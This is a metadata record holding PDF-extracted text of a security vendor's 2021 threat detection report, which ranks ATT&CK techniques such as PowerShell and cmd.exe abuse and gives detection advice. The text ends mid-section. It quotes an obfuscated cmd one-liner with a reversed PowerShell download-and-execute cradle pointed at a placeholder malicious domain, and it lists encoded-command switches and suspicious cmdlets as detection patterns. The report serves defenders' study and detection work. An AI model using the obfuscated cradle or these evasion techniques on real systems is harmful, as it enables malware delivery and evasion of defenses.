{
    "id": "25e86ce1-5e3e-4e16-9998-7542cf4c8bd3",
    "created_at": "2022-10-25T16:48:21.905054Z",
    "updated_at": "2025-03-27T02:17:24.723904Z",
    "deleted_at": null,
    "sha1_hash": "e40d9c0eb0646382435e1931ce010cb59ce0b3b9",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-06-29T10:24:49Z",
    "file_modification_date": "2021-06-29T10:26:26Z",
    "file_size": 8396004,
    "plain_text": "### 2021 Threat  Detection Report\n\n# [2] 0 2 1\n\n\n-----\n\n###### I N T R O D U C T I O N            3\n\n M E T H O D O L O G Y            5\n\n\n###### T O P T E C H N I Q U E S  10\n\n#1 T1059 Command and Scripting Interpreter 11\n\nT1059.001 PowerShell 12\n\nT1059.003 Windows Command Shell 16\n\n#2 T1218 Signed Binary Process Execution 20\n\nT1218.011 Rundll32 21\n\nT1218.005 Mshta 26\n\n#3 T1543 Create and Modify System Process 33\n\nT1543.003 Windows Service 34\n\n#4 T1053 Scheduled Task/Job 39\n\nT1053.005 Scheduled Task 40\n\n#5 T1003 OS Credential Dumping 47\n\nT1003.001 LSASS Memory 48\n\n#6 T1055 Process Injection 53\n\n#7 T1027 Obfuscated Files or Information 58\n\n#8 T1105 Ingress Tool Transfer 64\n\n#9 T1569 System Services 69\n\nT1569.002 Service Execution 70\n\n#10 T1036 Masquerading 73\n\nT1036.003 Rename System Utilities       74\n\n\n###### T O P T H R E AT S  78\n\n#1 TA551 79\n\n#2 Cobalt Strike 84\n\n#3 Qbot 88\n\n#4 IcedID 92\n\n#5 Mimikatz 96\n\n#6 Shlayer 100\n\n#7 Dridex 103\n\n#8 Emotet 107\n\n#9 TrickBot 112\n\n#10 Gamarue 115\n\n\n###### O T H E R T H R E AT S  119\n\n\n-----\n\n###### I N T R O D U C T I O N\n\n##### Welcome to the 2021  Threat Detection Report\n\nThis in-depth look at the most prevalent ATT&CK® techniques is designed to help\nyou and your team focus on what matters most.\n\n##### Getting started\n\nWelcome to Red Canary’s 2021 Threat Detection Report. Based on in-depth\n\nanalysis of roughly 20,000 confirmed threats detected across our customers’\n\nenvironments, this research arms security leaders and their teams with\n\nactionable insight into the malicious activity and techniques we observe\n\nmost frequently.\n\nUsing the MITRE ATT&CK® framework as scaffolding, our analysis offers a bird’s\n\neye view of the malicious behaviors that you’re most likely to encounter—and\n\nempowers you to address those threats head on with detailed detection\n\nstrategies that you can implement immediately. Whether you’re a CSO weighing\n\nnext year’s infosec budget, an intel analyst on the tails of a specific threat actor,\n\nor an engineer looking to tune your detection logic, the Threat Detection Report\n\nhas insight for security professionals of all stripes.\n\n###### How to use the report:\n\n- Start perusing the most prevalent techniques and threats to see what we’ve\n\nobserved in our customers’ environments\n\n- Explore how to detect and mitigate specific threats and techniques with\n\nideas and recommendations from our detection engineers, researchers,\n\nand intelligence analysts\n\n- Talk with your team about how the ideas, recommendations, and priorities\n\nfit into your security controls and strategy\n\n\n###### INVESTIGATIVE LEADS\n\n#### 20K\n\n###### CONFIRMED THREATS\n\n#### 1\n\n###### REPORT\n\n\n-----\n\n###### W H AT ’ S N E W I N 2 0 2 1\n\n More granular analysis\n\nMITRE ATT&CK’s adoption of\n\nsub-techniques transformed the\n\noverall structure of the report as\n\nwell as the scope of Red Canary’s\n\ntechnique analysis.\n\n###### Acknowledgements\n\n\n###### Intel-fortified\n\nOur Intelligence Team compiled the\n\ntop 10 most prevalent threats we\n\nencountered in 2020, putting the top 10\n\ntechniques in context with malware and\n\nother activity that leverages them.\n\n\n###### The return of  the PDF\n\nYou asked, we listened! By popular\n\ndemand, this year’s report is available\n\nnot only in web format, but also in PDF\n\nformat so you can annotate it to your\n\nheart’s content.\n\n\nIt takes an army to produce a research piece of this magnitude. Thanks to\n\nthe detection engineers, researchers, intelligence analysts, writers, editors,\n\ndesigners, developers, and project managers who invested countless hours in\n\nthis report—and the operational work it’s derived from. And a huge thanks to\n\nthe MITRE ATT&CK team, whose framework has helped the community take a\n\ngiant leap forward in understanding and tracking adversary behaviors.\n\n\n-----\n\n##### Methodology\n\nSince 2013, Red Canary has delivered high-quality threat detection to\n\norganizations of all sizes. Our platform collects hundreds of terabytes of\n\nendpoint telemetry every day, surfacing evidence of threats that are analyzed\n\nby our Cyber Incident Response Team (CIRT). Confirmed threats are tied to\n\ncorresponding MITRE ATT&CK® techniques to help our customers clearly\n\nunderstand what is happening in their environments. This report is a summary\n\nof confirmed threats derived from this data.\n\nCreating metrics around techniques and threats is a challenge for any\n\norganization. To help you better understand the data behind this report and\n\nto serve as a guide for how you can create your own metrics, we want to share\n\nsome details about our methodology.\n\n###### Behind the data\n\nTo understand our data, you need to understand how we detect malicious and\n\nsuspicious behavior in the first place. We gather telemetry from our customers’\n\nendpoints and feed it through a constantly evolving library of detection\n\nanalytics. Each detection analytic is mapped to one or more ATT&CK techniques\n\nand sub-techniques, as appropriate. When telemetry matches the logic in\n\none of our detection analytics, an event is generated for review by our\n\ndetection engineers.\n\n\n-----\n\nWhen a detection engineer determines that one or more events for a specific\n\nendpoint surpasses the threshold of suspicious or malicious behavior, a\n\nconfirmed threat detection documenting the activity is created for that\n\nendpoint. These confirmed threat detections inherit the ATT&CK techniques\n\nthat were mapped to the analytics that alerted us to the malicious or suspicious\n\nbehaviors in the first place.\n\nIt’s important to understand that the techniques and sub-techniques we’re\n\ncounting are based on our analytics—and not on the review performed by our\n\ndetection engineers, during which they include more context into detections.\n\nWe’ve chosen this approach out of efficiency and consistency. However, the\n\nlimitation of this approach is that context gleaned during the investigation of a\n\nthreat does not contribute to its technique mapping, and, by extension, some\n\nsmall percentage of threats may be mapped incorrectly or impartially. That said,\n\nwe continually review these confirmed threats, and we do not believe that there\n\nare a significant number of mapping errors in our dataset.\n\n###### Changes in ATT&CK\n\nIn 2020, MITRE released a version of ATT&CK that effectively added a new\n\ndimension to the matrix, in the form of sub-techniques. We took this change as\n\nan opportunity to comprehensively review the thousands of detection analytics\n\nwe’d created over the years. In addition to specifically realigning our analytics so\n\nthat they would map to sub-techniques, we were also able to standardize how\n\nwe mapped our analytics to ATT&CK in general. This sort of mapping may seem\n\nstraightforward, but it really isn’t. Over a period of years, we had many different\n\npeople interpreting the framework in many different ways. Naturally, this led to\n\na level of inconsistency that we wanted to fix. We implemented new guidelines\n\nfor mapping detection analytics to techniques and applied this to our entire\n\nlibrary.\n\nWe recommend that any organization mapping to ATT&CK (or any framework)\n\ncreate a set of standard guidelines for analysts. While frameworks seem simple,\n\nthe choice of how to map information is a subjective human decision, and\n\nguidelines help keep everyone aligned.\n\nThe changes we made in mapping our detection analytics resulted in a more\n\naccurate representation of techniques being used. However, our remapping\n\neffort to sub-techniques means that it is difficult to compare our 2021 Threat\n\nDetection Report to last year’s report. While we realize this causes some\n\nconfusion, we believe updating to the latest ATT&CK version ensures a solid\n\nfoundation in the data underlying our report.\n\n\n-----\n\n###### Okay, so how do you count?\n\nNow that we’ve explained how we map to MITRE, you may be wondering how we\n\ntally the scores for the Threat Detection Report. Our methodology for counting\n\ntechnique prevalence has largely remained consistent since the original report\n\nin 2019. For each malicious or suspicious detection we published during the\n\nyear, we incremented the count for each technique reflected by a detection\n\nanalytic that contributed to that detection. (We excluded data from detections\n\nof unwanted software from these results.) If that detection was remediated,\n\nand the host was reinfected at a later date, a new detection would be created,\n\nthus incrementing the counts again. While this method of counting tends to\n\noveremphasize techniques that get reused across multiple hosts in a single\n\nenvironment (such as when a laterally moving adversary generates multiple\n\ndetections within a single environment), we feel this gives appropriate weight to\n\nthe techniques you are most likely to encounter as a defender.\n\nFor the purposes of this report, we decided to set our rankings based on\n\ntechniques, even though the majority of our analysis and detection guidance will\n\nbe based on sub-techniques. This seemed to be the most reasonable approach,\n\nconsidering the following:\n\n- Sometimes we map to a technique that doesn’t have sub-techniques\n\n- Sometimes we map to sub-techniques\n\n- Sometimes we map generally to a technique but not to its subs\n\nWe acknowledge the imperfection of this solution, but we also accept that this\n\nis a transition year for both ATT&CK and Red Canary. In cases where a parent\n\ntechnique has no subs or subs that we don’t map to, we will analyze the parent\n\ntechnique on its own and provide detection guidance for it. However, in cases\n\nwhere sub-technique detections are rampant for a given parent technique,\n\nwe will focus our analysis and detection guidance entirely on sub-techniques\n\nthat meet our requirements for minimum detection volume. To that point, we\n\ndecided to analyze sub-techniques that represented at least 20 percent of the\n\ntotal detection volume for a given technique. If no sub-technique reached the 20\n\npercent mark, then we analyzed the parent.\n\n###### What about threats?\n\nNew to this year’s report is a ranking of the 10 most prevalent threats we\n\nencountered in 2020. The Red Canary Intelligence Team seeks to provide\n\nadditional context about threats to help improve decision-making. By\n\nunderstanding what threats are present in a detection, customers can better\n\nunderstand how they should respond. Throughout 2020, the Intelligence Team\n\nsought to improve how we identified and associated threats in detections. We\n\n\n-----\n\nchose to define “threats” broadly as malware, threat groups, activity clusters,\n\nor any other threat. We took two main approaches to associating a detection to\n\na threat: automatically associating them based on patterns identified for each\n\nspecific threat and manually associating them based on intelligence analyst\n\nassessments conducted while reviewing each detection.\n\nAll that said, how did we tally the numbers for the most prevalent threats? In\n\ncontrast to our technique methodology, we counted threats by the unique\n\nenvironments affected. Whereas for techniques we counted multiple detections\n\nwithin the same customer environment as distinct tallies, for threats we\n\ndecided to only count by the number of customers who encountered that threat\n\nduring 2020. This is due to the heavy skew introduced by incident response\n\nengagements for laterally moving threats that affect nearly every endpoint in an\n\nenvironment (think ransomware).\n\nHad we counted threats by individual detections, ransomware and the\n\nlaterally moving threats that lead up to it (e.g., Cobalt Strike) would have been\n\ndisproportionately represented in our data. We believe counting in this way\n\ngives an appropriate measure of how likely each threat is to affect any given\n\norganization, absent more specific threat modeling details for that organization.\n\nIt also serves as a check against the acknowledged bias in the way we count\n\ntechnique prevalence.\n\n###### Limitations\n\nThere are a few limitations to our methodology for counting threats, as there are\n\nfor any approach. Due to the nature of our visibility (i.e., that we predominantly\n\nleverage endpoint detection and response data), our perspective tends to weigh\n\nmore heavily on threats that made it through the external defenses—such as\n\nemail and firewall gateways—and were able to gain some level of execution on\n\nvictim machines. As such, our results are likely different than what you may see\n\nfrom other vendors focused more on network or email-based detection. For\n\nexample, though phishing is a generally common technique, it didn’t make it\n\ninto our top 10.\n\nAnother important limitation to our counting method may seem obvious: we\n\nidentify threats we already know about. As our nascent Intelligence Team began\n\nin 2019, it wasn’t until mid-2020 that we began to thoroughly review all malicious\n\ndetections in earnest. And while we have built a considerable knowledge base\n\nof intelligence profiles, the vast and ever-changing threat landscape presents\n\nmany unique threats that we are unable to associate (though in some cases we\n\n[have been able to cluster these under new monikers such as Blue Mockingbird](https://redcanary.com/blog/blue-mockingbird-cryptominer/)\n\n[or Silver Sparrow). If we are able to identify a repeatable pattern for a certain](https://redcanary.com/blog/clipping-silver-sparrows-wings/)\n\nthreat and automate its association, we observe the threat more often.\n\n\n-----\n\nThis means that while the top 10 threats are worth focusing on, they are\n\nnot the only threats that analysts should focus on, since there may be other\n\nimpactful ones that are unidentified and therefore underreported. Despite\n\nthese flaws, we believe that the analysis and detection guidance across the\n\nthreats and techniques in this report is reflective of the overall landscape, and,\n\nif implemented, offers a great deal of defense-in-depth against the threats that\n\nmost organizations are likely to encounter.\n\nKnowing the limitations of any methodology is important as you determine\n\nwhat threats your team should focus on. While we hope our top 10 threats and\n\ndetection opportunities help prioritize threats to focus on, we recommend\n\nbuilding out your own threat model by comparing the top threats we share in\n\nour report with what other teams publish and what you observe in your\n\nown environment.\n\n\n-----\n\n##### Top Techniques\n\nThe following chart illustrates the ranking of MITRE ATT&CK techniques\nassociated with confirmed threats across our customers’ environments. We\ncounted techniques by total threat volume, and the percentages below are a\nmeasure of each technique’s share of overall detection volume. Since multiple\ntechniques can be mapped to any confirmed threat, the percentages below add\nup to more than 100 percent.\n\n\n###### T1059 Command  and Scripting Interpreter\n\n T1218 Signed Binary  Process Execution\n\n T1543 Create and  Modify System Process\n\n T1053 Scheduled Task / Job\n\n T1003 OS Credential Dumping\n\n T1055 Process Injection\n\n T1027 Obfuscated Files  or Information\n\n T1105 Ingress Tool Transfer\n\n T1569 System Services\n\n T1036 Masquerading\n\n\n###### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7\n\n 8\n\n 9\n\n 10\n\n\n###### 24% of total threats\n\n\n###### 19%\n\n\n###### 16%\n\n\n###### 16%\n\n\n###### 7%\n\n\n###### 7%\n\n\n###### 6%\n\n\n###### 5%\n\n\n###### 4%\n\n\n###### 4%\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 5 9\n\n##### Command and  Scripting Interpreter\n\nCommand and Scripting Interpreter tops our list this year thanks in large part to\ndetections associated with two of its sub-techniques: PowerShell and Windows\n\n\n###### OVERALL RANK\n\n#### 72.2%\n\n\nCommand Shell.\n\n\n**T 1 0 5 9 . 0 0 1**\n\n###### PowerShell\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 4,798\n\n\n###### 48.7%\n\nORGANIZATIONS AFFECTED\n\n\n###### 2,366\n\nCONFIRMED THREATS\n\n\nPowerShell was the most common technique we observed in 2020,\naffecting nearly half of our customers. It remains among the most\nversatile of built-in utilities for adversaries, defenders, and system\nadministrators alike.\n\n\n###### CONFIRMED THREATS\n\n\n**S E E M O R E  >**\n\n\n**T 1 0 5 9 . 0 0 3**\n\n###### Windows Command Shell\n\n\n###### 38.4%\n\nORGANIZATIONS AFFECTED\n\n\n###### 1,984\n\nCONFIRMED THREATS\n\n\nWhile it doesn’t do much on its own, Windows Command Shell can\ncall on virtually any executable on the system to execute batch files\nand arbitrary tasks.\n\n\n**S E E M O R E  >**\n\n\n###### T 1 0 5 9 : C O M M A N D A N D S C R I P T I N G\n\n“Adversaries may abuse command and script interpreters to execute commands,\n\n\nscripts, or binaries. These interfaces and languages provide ways of interacting with\n\ncomputer systems and are a common feature across many different platforms. Most\n\nsystems come with some built-in command-line interface and scripting capabilities,\n\nfor example, macOS and Linux distributions include some flavor of Unix Shell while\n\n\nWindows installations include the Windows Command Shell and PowerShell.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 5 9 . 0 0 1\n\n##### PowerShell\n\nPowerShell was the most common technique we observed in 2020, affecting\nnearly half of our customers. It remains among the most versatile of built-in\nutilities for adversaries, defenders, and system administrators alike.\n\n##### Analysis\n\n###### Why do adversaries use PowerShell?\n\nPowerShell is a versatile and flexible automation and configuration\n\nmanagement framework built on top of the .NET Common Language Runtime\n\n(CLR), which expands its capabilities beyond other common command-line and\n\nscripting languages. PowerShell is included by default in modern versions of\n\nWindows.\n\nAdversaries use PowerShell to obfuscate commands in hopes of achieving any of\n\nthe following:\n\n- evading detection\n\n- spawning additional processes\n\n- downloading and executing remote code and binaries\n\n- gathering information\n\n- changing system configuration\n\nAdversaries rely on PowerShell’s versatility and ubiquitous presence on target\n\nsystems, minimizing the need to additionally customize payloads.\n\n###### How do adversaries use PowerShell?\n\nWhile PowerShell offers adversaries a plethora of options, the most common\n\nuses include:\n\n- executing commands\n\n- leveraging encoded commands\n\n- obfuscation (with and without encoding)\n\n- downloading additional payloads\n\n- launching additional processes\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 48.7%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 2,366\n\n###### CONFIRMED THREATS\n\n\n-----\n\nPowerShell is frequently observed in phishing campaigns, where emails with\n\nweaponized attachments containing embedded code launch a payload. In many\n\ncases, such as with Emotet, this payload executes encoded and obfuscated\n\nPowerShell commands that download and execute additional code or a\n\nmalicious binary from a remote resource.\n\nWe encounter encoding or obfuscation more than any other variety of malicious\n\nor suspicious PowerShell. PowerShell’s flexibility—along with its support for\n\naliases, abbreviated cmdlets, argument names, and calling .NET methods—\n\noffers attackers many ways to invoke Base64 and other encoding. Below is a\n\ncase-agnostic review of the methods we commonly observe in rank order, with\n\napproximate percentages representing their frequency of occurrence in our\n\ndetections:\n\n- 27%: -e\n\n- 25%: -ec\n\n- 21%: -encodecommand\n\n- 15%: [System.Convert]::FromBase64String()\n\n- 6%: -encoded\n\n- 4%: -enc\n\n- 1%: -en\n\n- .4%: -encod\n\n- .01%: -enco\n\n- < .01%: -encodedco, -encodedc, -en^c\n\nGiven PowerShell’s support for shortened command-line arguments,\n\nescape characters in the command line, and more, do not consider the above\n\nlist comprehensive.\n\n###### Emerging Windows Command  Shell tradecraft\n\nWhile leveraging PowerShell, adversaries have been known to use format\n\n**[string obfuscation (i.e., the dynamic building of strings by using non-standard](https://ss64.com/ps/syntax-f-operator.html)**\n\nsequences of format string operators like {0} and {1}) instead of Base64 encoding.\n\nWe’ve also encountered different mechanisms to obfuscate commands and\n\npayloads; these not only leverage common characters for obfuscation (such as ^\n\nor +), but also variables that are broken up initially to help evade detection and\n\nthen concatenated back together for execution.\n\n\n###### T 1 0 5 9 . 0 0 1 :  P O W E R S H E L L\n\n“Adversaries may abuse PowerShell\n\ncommands and scripts for execution.\n\nPowerShell is a powerful interactive\n\ncommand-line interface and scripting\n\nenvironment included in the Windows\n\noperating system. Adversaries can\n\nuse PowerShell to perform a number\n\nof actions, including discovery of\n\ninformation and execution of code.\n\nExamples include the Start-Process\n\ncmdlet which can be used to run an\n\nexecutable and the Invoke-Command\n\ncmdlet which runs a command locally\n\nor on a remote computer (though\n\nadministrator permissions are required\n\nto use PowerShell to connect to\n\nremote systems).”\n\n\n-----\n\n##### Detection\n\n###### Collection requirements\n\n Process and command-line monitoring\n\nCommand-line parameters are by far the most efficacious for detecting\n\npotentially malicious PowerShell behavior, at least as far as standard process\n\ntelemetry is concerned. Logs such as Anti-Malware Scan Interface (AMSI), script\nblock, or Sysmon can be particularly helpful for detecting PowerShell.\n\n###### Detection opportunities\n\n Encoding command switch\n\nEncoding and obfuscation tend to go together. Watch for the execution\n\nof powershell.exe with command lines that include variations of the\n\n**-encodecommand argument; PowerShell will recognize and accept anything**\n\nfrom -e onward, and it will show up outside of the encoded bits. The following\n\nare example variations on the shortened, encoded command switch:\n\n**•** **-e**\n\n**•** **-ec**\n\n**•** **-encodecommand**\n\n**•** **-encoded**\n\n**•** **-enc**\n\n**•** **-en**\n\n**•** **-encod**\n\n**•** **-enco**\n\nThis is a starting point, so be prepared for some initial noise as you implement\n\nand tune this detection logic.\n\n###### Base64 encoding\n\nBase64 encoding isn’t inherently suspicious, but it’s worth looking out for in a\n\nlot of environments. As such, looking for the execution of a process that seems\n\nto be powershell.exe along with a corresponding command line containing the\n\nterm base64 is a good way to detect a wide variety of malicious activity. Beyond\n\nalerting on PowerShell that leverages Base64 encoding, consider leveraging\n\n[a tool—like CyberChef, for example—that is capable of decoding encoded](https://github.com/gchq/CyberChef)\n\ncommands.\n\n\n-----\n\n###### Obfuscation\n\nOnce decoded (from Base64), you may encounter compressed code, more\n\nBase64 blobs, and decimal, ordinal, and obfuscated commands. Obfuscation\n\n(whether inside or outside the encoding) breaks up detection methodologies by\n\nsplitting commands or parameters, inserting extra characters (that are ignored\n\nby PowerShell), and other janky behavior. You can use regular expressions (such\n\nas regex) to increase fidelity and help flag more interesting activity from within\n\nthe decoded sections. Monitoring for the execution of PowerShell with unusually\n\nhigh counts of characters like ^, +, $, and % may help you detect suspicious and\n\nmalicious behavior.\n\n###### Suspicious cmdlets\n\nOnce the command line is decoded to human-readable text, you can also watch\n\nfor various cmdlets, methods, and switches that may indicate malicious activity.\n\nThese may include strings such as Invoke-Expression (or variants like iex and\n\n**.invoke), the DownloadString or DownloadFile methods, or unusual switches like**\n\n**-nop or -noni.**\n\n###### Weeding out false positives\n\nMonitoring for encoded commands may seem like an easy win, and it is certainly\n\na place to start. However, you will quickly find that many platforms and\n\nadministrators leverage PowerShell and use encoded commands as a part of\n\nnormal workflows. As such, flagging activity simply based on variations of the\n\n**-encodedcommand switch may generate a significant amount of noise. Start**\n\nwith queries against offline or static data to get a feel for volume.\n\nOnce you have a better understanding of your overall volume, identify patterns\n\nwithin the decoded data. Leverage your knowledge of what is normal for your\n\nenvironment in order to identify what is potentially malicious. Automation is\n\ncritical to not just detecting encoded commands, but the contents of those\n\ncommands once decoded. Prior to applying detection logic, feed encoded\n\ncommand lines into a workflow that decodes them; that way, you are increasing\n\nfidelity from the start.\n\n\n###### Frank McClain\n\n**C I R T**\n**T R A I N I N G L E A D**\n\nFrank is responsible for building and\n\nmaintaining the Red Canary CIRT\n\ntraining program. He leads all aspects\n\nincluding onboarding new employees\n\nand fostering the development of\n\nnew or expanding skillsets. Frank\n\nis an accomplished cyber security\n\ninvestigator and information assurance\n\npractitioner with deep experience in\n\ndigital forensics and incident response\n\n(DFIR). He paid his dues in DFIR\n\nconsulting before going on to manage\n\nsecurity operations for a national\n\nfinancial services firm, where he built\n\nand led the team responsible for\n\ncontinuous monitoring, threat analysis,\n\nand incident response.\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 5 9 . 0 0 3\n\n##### Windows Command Shell\n\nWhile it doesn’t do much on its own, Windows Command Shell can call\non virtually any executable on the system to execute batch files and\narbitrary tasks.\n\n##### Analysis\n\n###### Why do adversaries use Windows Command Shell?\n\nWindows Command Shell is ubiquitous across all versions of Windows and,\n\nunlike its more sophisticated and capable cousin, PowerShell, the Windows\n\nCommand Shell takes no dependencies on specific versions of .NET. While\n\nCommand Shell’s native capabilities are limited, they have been stable for years,\n\nmaybe even decades. Adversaries know that if cmd.exe works in their lab, it’s\n\ngoing to work in the field.\n\nThe Windows Command Shell is the no-frills field general in an adversary’s\n\narsenal. It may not be able to do much on its own, but it is capable of calling on\n\nvirtually any executable on the system to carry out its mission.\n\nBecause Command Shell can execute batch files, adversaries can use it to\n\nreliably and repeatedly execute arbitrary tasks.\n\n###### How do adversaries use Windows Command Shell?\n\nIn a review of more than 1,000 confirmed threat detections, we found cmd.exe\n\ncalled more than 6,000 times in more than 4,000 unique command lines across\n\nhundreds of customer environments. PowerShell was a child process of cmd\n\nin more than 480 instances. We saw more than 350 references to unique batch\n\nfiles and 270 unique scheduled tasks calling **cmd across more than 30 customer**\n\nenvironments.\n\nOne of the most commonly observed techniques is the use of cmd to call native\n\ncommands and redirect the output of those commands to a file on the local\n\nadmin share, for example:\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 38.4%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 1,984\n\n###### CONFIRMED THREATS\n\n\n-----\n\n[This technique is consistent with Impacket, an open source tool that adversaries](https://github.com/SecureAuthCorp/impacket)\n\nuse to manipulate networking protocols. We observed similar patterns of\n\nexecution and output redirection nearly 400 times across more than a dozen\n\ncustomer environments.\n\n###### Emerging Windows Command  Shell tradecraft\n\nWindows Command Shell was originally released in 1987 and, though it has new\n\nuser-interface features in Windows 10, it has a relatively limited set of built-in\n\ncommands—commands that may be invoked without starting a new process\n\non the system. This old dog isn’t really doing new tricks. In the last quarter of\n\n2020, we observed 11 detections for cmd.exe replacing utilman.exe enabling\n\nauthentication bypass. The only Windows Command Shell detections with\n\nhigher frequency counts in that quarter involved suspected red team activity\n\nand similar internal testing tools.\n\nHaving said that, if there is anything novel involving cmd.exe, it may be\n\n[obfuscation. In the spring of 2018, Daniel Bohannon released a whitepaper on](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf)\n\n[DOS obfuscation techniques and a framework called Invoke-DOSfucation for](https://github.com/danielbohannon/Invoke-DOSfuscation)\n\ncreating obfuscated DOS command lines that could be used to evade simple,\n\nsignature-based detections and slow down human analysis. In our data set of\n\nmore than 1,000 detections involving the Windows Command Shell, we found 91\n\nunique command lines involving some measure of obfuscation. The most heavily\n\nobfuscated DOS command we observed was similar to the one shown here:\n\n\n-----\n\nIn the Windows Command Shell, the caret (^) character is an escape character.\n\nWhen it precedes special characters, like the pipe (|) character or file redirection\n\noperators (<>), those special characters will be treated as normal characters.\n\nWhen the caret symbol precedes non-special characters, nothing special\n\nhappens; it is effectively ignored. So the command above becomes:\n\n\n###### T 1 0 5 9 . 0 0 3 :  W I N D O W S  C O M M A N D S H E L L\n\n“Adversaries may abuse the Windows\n\ncommand shell for execution. The\n\nWindows command shell (cmd.exe)\n\nis the primary command prompt\n\non Windows systems. The Windows\n\ncommand prompt can be used to\n\ncontrol almost any aspect of a system,\n\nwith various permission levels required\n\nfor different subsets of commands.”\n\n```\ncmd /V/C”set N1=   }}{hctac};kaerb;iB$ metIekovnI;)iB$,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ ni\ndq$(hcaerof;’exe.’+Kjm$+’\\’+cilbup:vne$=iB$;’963’\n= Kjm$;)’@’(tilpS.’detcefni=l?php.suoici/lam/\nniamod.live//:ptth’=tlm$;tneilCbeW.teN tcejbowen=cAB$ llehsrewop&&for /L %R in (265;-1;0)do\nset ZR=!ZR!!N1:~%R,1!&&if %R==0 call %ZR:*ZR!=%\n\n```\n\nLooking at this command carefully, we can see it sets a variable named N1 to\n\na string containing a PowerShell command that is reversed. There’s a For loop\n\nthat reverses this string and executes it. The PowerShell command creates a\n\ndownload cradle to download a file and invokes it via a call to Invoke-Item.\n\nWhile these obfuscated commands may evade simple, signature-based\n\ndetections, analytics that look for commonly used obfuscation techniques, such\n\nas the presence of caret characters, can easily detect them. Layered detection\n\nanalytics will also help. If a detection misses the obfuscated DOS commands,\n\nanother detection may trigger on the PowerShell download cradle, the call to\n\n**Invoke-Item, or a DNS lookup to an unusual domain.**\n\n##### Detection\n\n###### Collection requirements\n\n Process and command-line monitoring\n\nWindows Security Event Logs—specifically Process Creation (ID 4688) events\n\nwith command-line argument logging enabled—will be the best source of\n\nobserving and detecting malicious usage of the Windows Command Shell.\n\nHaving a good understanding of baseline scripts and processes that call the\n\nWindows Command Shell is essential to reducing noise and combating potential\n\nfalse positive alerts.\n\n\n-----\n\n###### Detection requirements\n\nFocus on the uncommon patterns of execution and patterns of execution\n\ncommonly associated with malice. If you’re trying to detect various flavors of\n\nobfuscation, consider monitoring for the following:\n\n- the execution of a process that seems to be cmd.exe in conjunction with a\n\ncommand line containing high numbers of characters that suggest the use\n\nof obfuscation, like ^, =, %, !, [, (, ;\n\n- excessive use of the set and call commands in the context of a cmd.exe\n\nprocess\n\n- unusually high numbers of multiple whitespaces in the command line\n\n- redirection of output to the localhost’s admin share: e.g., > \\\\\n\n**computername\\c$**\n\n- execution of commands associated with other attack techniques\n\n(such as calls to regsvr32.exe or regasm.exe that load unusual dynamic\n\nlink libraries)\n\n- calls to reg.exe that modify registry keys to enable or disable things like\n\nRemote Desktop or User-Access-Control, or that write data to or read from\n\nunusual registry keys\n\nConsider stripping the following characters from your command line before\n\napplying your detection logic: ( “ ) ^\n\nThough cmd.exe itself is fairly limited in its capabilities, it has many tools it can\n\ncall into the fight. Having a good understanding of those tools is essential to\n\ndetecting malicious use of Windows Command Shell.\n\n###### Weeding out false positives\n\nUnfortunately, the best data source for detecting malicious use of the Windows\n\nCommand Shell—Process Creation events with command-line arguments\n\ncaptured (Event ID 4688 in the Windows Security Event log)—will also be the\n\nprimary source of false positives. Understanding your environment and how\n\nWindows Command Shell is normally used will help you separate the wheat from\n\nthe chaff. Create filters to bucket normal usage, unusual usage, and suspicious\n\nor known malicious usage to build a successful detection pipeline that doesn’t\n\noverwhelm analysts with false positives.\n\n\n###### Matt Graeber\n\n**D I R E C T O R O F**\n**T H R E AT R E S E A R C H**\n\nMatt has worked the majority of his\n\nsecurity career in offense, facilitating\n\nhis application of an attacker’s mindset\n\nto detection engineering, which\n\ninvolves developing detection evasion\n\nstrategies. By pointing out gaps in\n\ndetection coverage, Matt is able to\n\neffectively offer actionable detection\n\nimprovement guidance. Matt loves to\n\napply his reverse engineering skills\n\nto understand attack techniques\n\nat a deeper level in order to more\n\nconfidently contextualize them,\n\nunderstand relevant detection optics,\n\nand to understand the workflow\n\nattackers use to evade security\n\ncontrols. Matt is committed to making\n\nsecurity research both accessible\n\nand actionable.\n\n\n-----\n\n###### T E C H N I Q U E T 1 2 1 8\n\n##### Signed Binary  Proxy Execution\n\nSigned Binary Proxy Execution ranks second this year thanks in large part to\n\n\n###### OVERALL RANK\n\n#### 49.3%\n\n\ndetections associated with two of its sub-techniques: Rundll32 and Mshta.\n\n\n**T 1 2 1 8 . 0 1 1**\n\n###### Rundll32\n\n\n###### 30%\n\nORGANIZATIONS AFFECTED\n\n\n###### 2,380\n\nCONFIRMED THREATS\n\n\nAdversaries use this native Windows process to execute malicious\ncode through dynamic link libraries (DLL), often to bypass\napplication controls.\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 3,755\n\n\n###### CONFIRMED THREATS\n\n\n**S E E M O R E  >**\n\n\n**T 1 2 1 8 . 0 0 5**\n\n###### Mshta\n\n 18.8%\n\n\nORGANIZATIONS AFFECTED\n\n\n###### 738\n\nCONFIRMED THREATS\n\n\nMshta is attractive to adversaries both in the early and latter stages\nof an infection because it enables them to proxy the execution of\narbitrary code through a trusted utility.\n\n\n**S E E M O R E  >**\n\n\n###### T 1 2 1 8 : S I G N E D B I N A R Y P R O C E S S E X E C U T I O N\n\n“Adversaries may bypass process and/or signature-based defenses by proxying\n\n\nexecution of malicious content with signed binaries. Binaries signed with trusted digital\n\ncertificates can execute on Windows systems protected by digital signature validation.\n\nSeveral Microsoft signed binaries that are default on Windows installations can be used\n\nto proxy execution of other files.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 2 1 8 . 0 1 1\n\n##### Rundll32\n\nAdversaries use this native Windows process to execute malicious code through\ndynamic link libraries (DLL), often to bypass application controls.\n\n##### Analysis\n\n###### Why do adversaries use Rundll32?\n\nLike many of the most prevalent ATT&CK techniques, Rundll32 is a native\n\nWindows process that’s installed by default on nearly every Microsoft computer\n\ndating back to Windows 95. It is a functionally necessary component of the\n\nWindows operating system that can’t be simply blocked or disabled. This\n\nnecessity and ubiquity makes Rundll32 an attractive target for adversaries\n\nintent on blending 